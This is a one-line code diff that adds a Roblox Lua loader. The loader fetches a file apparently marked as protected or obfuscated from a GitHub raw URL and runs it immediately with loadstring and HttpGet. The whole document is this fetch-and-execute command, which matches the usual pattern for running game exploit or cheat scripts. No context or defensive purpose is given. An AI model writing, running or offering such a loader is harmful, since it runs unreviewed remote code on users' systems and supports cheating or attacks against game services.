@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BrySadW/Manocounty/main/Protected_3243004946110332.bib'))()
